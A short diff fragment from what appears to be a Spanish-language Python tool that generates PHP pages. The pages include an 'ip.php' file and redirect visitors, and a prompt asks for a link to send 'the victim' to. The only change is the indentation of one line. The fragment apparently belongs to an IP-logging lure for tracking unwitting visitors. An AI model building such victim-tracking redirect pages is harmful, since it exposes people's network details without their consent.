@@ -47,7 +47,7 @@ include 'ip.php';
 header('Location: index.html');
 exit();
 ?>""")
-      file2.close()
+        file2.close()
     elif var1 == "n" or var1 == "N":
       link = input('\n[~] Ingresa el link para redirigir a la victima (e.j: https://youtube.com): ')      
       file = open('index.php', 'w')
